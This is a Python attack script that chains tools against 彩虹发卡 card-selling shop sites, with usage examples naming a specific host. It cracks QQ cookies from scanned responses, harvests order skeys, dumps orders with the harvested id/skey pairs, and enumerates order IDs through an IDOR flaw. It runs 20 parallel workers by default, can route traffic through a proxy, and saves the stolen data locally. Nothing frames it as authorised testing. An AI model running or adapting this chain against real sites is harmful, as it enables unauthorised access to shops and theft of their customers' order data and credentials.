#!/usr/bin/env python3
"""
彩虹发卡 skey 全链：body扫描 → harvest → showOrder → IDOR。

示例:
  python3 skey_chain.py -H qq8.one --contact QQ123 --start 1 --end 200
  python3 skey_chain.py -H qq8.one --skey KNOWN --order-id 37692
  python3 skey_chain.py -H TARGET --body-dir /data/recon/qq8.one/api
"""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
from pathlib import Path

from faka_common import ensure_out, log, resolve_proxy, save_hit

FAKA = Path("/data/tools/faka")
HARVEST = FAKA / "cookie" / "rainbow_skey_harvest.py"
CRACK = FAKA / "cookie" / "crack_qq_cookie.py"
ORDER_DUMP = FAKA / "rainbow_order_dump.py"
RAINBOW_IDOR = FAKA / "rainbow_idor.py"


def run_cmd(cmd: list[str], timeout: int = 600) -> str:
    log(f"[*] {' '.join(cmd)}")
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        text = (out.stdout or "") + (out.stderr or "")
        if text.strip():
            log(text[-2500:])
        return out.stdout or ""
    except Exception as e:
        log(f"[!] {e}")
        return ""


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="彩虹 skey 全链")
    ap.add_argument("-H", "--host", required=True)
    ap.add_argument("--base-path", default="/")
    ap.add_argument("--contact", default="")
    ap.add_argument("--login-user", default="")
    ap.add_argument("--login-pass", default="")
    ap.add_argument("--skey", default="")
    ap.add_argument("--order-id", default="")
    ap.add_argument("--body-dir", default="")
    ap.add_argument("--start", type=int, default=1)
    ap.add_argument("--end", type=int, default=200)
    ap.add_argument("-w", "--workers", type=int, default=20)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--skip-harvest", action="store_true")
    ap.add_argument("--skip-order", action="store_true")
    ap.add_argument("--skip-idor", action="store_true")
    ap.add_argument("--out", default="/data/tools/faka/out/skey_chain.jsonl")
    ap.add_argument("--dump-dir", default="/data/tools/faka/out/skey_chain_dump")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = resolve_proxy(args.proxy)
    proxy_arg = proxy if proxy else "none"
    url = f"https://{args.host.rstrip('/')}"
    out_dir = Path(args.dump_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    pairs_file = out_dir / "skey_pairs.json"

    result: dict = {"host": args.host, "pairs": []}

    if args.body_dir and CRACK.exists():
        crack_out = out_dir / "crack_report.json"
        run_cmd([sys.executable, str(CRACK), "--input", args.body_dir, "--out", str(crack_out)])
        if crack_out.exists():
            data = json.loads(crack_out.read_text(encoding="utf-8"))
            result["pairs"].extend(data.get("pairs", []))

    if not args.skip_harvest and HARVEST.exists():
        cmd = [
            sys.executable, str(HARVEST),
            "--host", args.host,
            "--path", args.base_path,
            "--out", str(out_dir),
            "--proxy", proxy,
        ]
        if args.contact:
            cmd += ["--contact", args.contact]
        if args.login_user:
            cmd += ["--login-user", args.login_user, "--login-pass", args.login_pass]
        if args.body_dir:
            cmd += ["--body-dir", args.body_dir]
        run_cmd(cmd)
        report = out_dir / "harvest_report.json"
        if report.exists():
            data = json.loads(report.read_text(encoding="utf-8"))
            result["pairs"].extend(data.get("pairs", []))
            result["harvest"] = data

    if args.skey and args.order_id:
        result["pairs"].append({"id": args.order_id, "skey": args.skey})

    # dedupe pairs
    seen = set()
    uniq = []
    for p in result["pairs"]:
        key = (str(p.get("id")), str(p.get("skey")))
        if key in seen or not p.get("id") or not p.get("skey"):
            continue
        seen.add(key)
        uniq.append(p)
    result["pairs"] = uniq
    pairs_file.write_text(json.dumps({"pairs": uniq}, ensure_ascii=False, indent=2), encoding="utf-8")
    log(f"[*] skey pairs={len(uniq)}")

    if not args.skip_order and uniq and ORDER_DUMP.exists():
        run_cmd([
            sys.executable, str(ORDER_DUMP),
            "-u", url,
            "--pairs-file", str(pairs_file),
            "--proxy", proxy_arg,
            "--dump-dir", str(out_dir / "orders"),
            "-w", str(args.workers),
        ])

    if not args.skip_idor and RAINBOW_IDOR.exists():
        run_cmd([
            sys.executable, str(RAINBOW_IDOR),
            "-u", url,
            "--start", str(args.start),
            "--end", str(args.end),
            "-w", str(args.workers),
            "--proxy", proxy_arg,
            "--dump-dir", str(out_dir / "idor"),
        ])

    save_hit(Path(args.out), "chain_done", result)
    log(f"完成 pairs={len(uniq)} -> {args.out}")


if __name__ == "__main__":
    main()
